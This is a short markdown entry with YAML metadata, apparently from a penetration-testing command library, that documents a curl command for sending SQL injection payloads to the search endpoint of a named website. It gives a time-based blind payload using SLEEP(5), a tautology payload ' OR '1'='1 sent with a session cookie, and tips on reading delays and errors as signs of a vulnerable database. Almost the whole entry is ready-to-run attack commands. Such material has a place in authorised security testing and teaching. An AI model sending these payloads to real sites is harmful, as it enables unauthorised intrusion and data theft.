---
id: c1d2e3f4-g5h6-7891-cdef-345678912345
data: >-
  curl -X GET "https://mars-website.com/search?q=1' AND SLEEP(5)--" -w
  "%{time_total}\n"
name: curl-send-payload
tags:
  - sqli
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:15:04.789Z'
verified: false
validated: true
submitted: true
---
# curl-send-payload

## Command

```bash
curl -X GET "https://mars-website.com/search?q=1' AND SLEEP(5)--" -w "%{time_total}\n"
```

## Description

This command uses curl to send an HTTP GET request with a SQL injection payload to the Mars website's search endpoint, measuring response time to detect blind SQLi via database delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `URL` | Target search endpoint with payload | Yes |
| `-w "%{time_total}\n"` | Prints total request time | No |
| `-v` | Verbose output for headers/errors | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://mars-website.com/search?q=test'" -v
```

### Advanced Usage

```bash
curl -X GET "https://mars-website.com/search?q=1' OR '1'='1" --cookie "session=abc" -w "%{time_total}\n"
```

## Expected Output

HTTP response body with potential SQL errors or normal search results, plus timing info (e.g., "5.123" seconds for successful delay). Look for anomalies like syntax errors or unexpected delays.

## Related

- [[commands/sqlmap-enumerate]]
- [[procedures/Test-SQL-Injection-in-Search]]
